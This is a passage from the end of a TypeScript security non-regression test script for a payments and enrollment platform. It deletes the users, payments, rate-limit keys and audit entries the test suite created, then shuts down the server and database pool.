      await db.delete(installmentItems).where(eq(installmentItems.planId, planId)).catch(() => {});
      await db.delete(installmentPlans).where(eq(installmentPlans.id, planId)).catch(() => {});
    }
    for (const uid of cleanupUserIds) {
      await db.delete(emailQueue).where(eq(emailQueue.userId, uid)).catch(() => {});
      await db
        .delete(userNotificationPreferences)
        .where(eq(userNotificationPreferences.userId, uid))
        .catch(() => {});
      await db.delete(enrollments).where(eq(enrollments.studentId, uid)).catch(() => {});
      await db.delete(paymentReminders).where(eq(paymentReminders.studentId, uid)).catch(() => {});
      await db.delete(notifications).where(eq(notifications.userId, uid)).catch(() => {});
      await db.delete(activeSessions).where(eq(activeSessions.userId, uid)).catch(() => {});
      await db.delete(invoices).where(eq(invoices.studentId, uid)).catch(() => {});
      await db.delete(chargilyCheckouts).where(eq(chargilyCheckouts.studentId, uid)).catch(() => {});
      await db.delete(installmentItems).where(eq(installmentItems.studentId, uid)).catch(() => {});
      await db.delete(installmentPlans).where(eq(installmentPlans.studentId, uid)).catch(() => {});
      await db.delete(payments).where(eq(payments.studentId, uid)).catch(() => {});
      await db.delete(subscriptions).where(eq(subscriptions.studentId, uid)).catch(() => {});
    }

    for (const pId of cleanupPaymentIds) {
      await db.delete(auditLogs).where(eq(auditLogs.entityId, pId)).catch(() => {});
      await db.delete(payments).where(eq(payments.id, pId)).catch(() => {});
    }
    for (const subId of cleanupSubscriptionIds) {
      await db.delete(subscriptions).where(eq(subscriptions.id, subId)).catch(() => {});
    }
    for (const key of cleanupRateKeys) {
      await db.delete(authRateLimits).where(eq(authRateLimits.key, key)).catch(() => {});
    }
    await db
      .delete(authRateLimits)
      .where(like(authRateLimits.key, 'account:spray.target.%'))
      .catch(() => {});

    if (createdPaymentId) {
      await db
        .delete(notifications)
        .where(and(eq(notifications.userId, 'usr_stu_1'), gte(notifications.createdAt, testStartIso)))
        .catch(() => {});
      await db.delete(auditLogs).where(eq(auditLogs.entityId, createdPaymentId)).catch(() => {});
      await db.delete(payments).where(eq(payments.id, createdPaymentId)).catch(() => {});
    }
    if (createdSubscriptionId) {
      await db.delete(subscriptions).where(eq(subscriptions.id, createdSubscriptionId)).catch(() => {});
    }
    for (const uid of cleanupUserIds) {
      await db.delete(studentProfiles).where(eq(studentProfiles.userId, uid)).catch(() => {});
      await db.delete(passwordResetTokensTable).where(eq(passwordResetTokensTable.userId, uid)).catch(() => {});
      await db.delete(auditLogs).where(eq(auditLogs.userId, uid)).catch(() => {});
      await db.delete(users).where(eq(users.id, uid)).catch(() => {});
    }
    await db
      .delete(notifications)
      .where(and(eq(notifications.userId, 'usr_adm_1'), gte(notifications.createdAt, testStartIso)))
      .catch(() => {});
    await db
      .delete(auditLogs)
      .where(
        and(
          eq(auditLogs.action, 'EMAIL_DELIVERY_FAILED_PERMANENTLY'),
          gte(auditLogs.timestamp, testStartIso)
        )
      )
      .catch(() => {});
    // Nettoyage des entrées d'audit de test créées durant l'exécution de la suite d'attaques
    await db
      .delete(auditLogs)
      .where(
        and(
          eq(auditLogs.action, 'SECURITY_IDOR_BLOCKED'),
          gte(auditLogs.timestamp, testStartIso)
        )
      )
      .catch(() => {});
    await new Promise<void>((resolve) => server.close(() => resolve()));
  }
}

runHttpNonRegressionSuite()
  .then(async () => {
    await createPool().end();
    process.exit(0);
  })
  .catch(async (err) => {
    console.error('\n❌ ÉCHEC DES TESTS :', err);
    await createPool().end().catch(() => {});
    process.exit(1);
  });
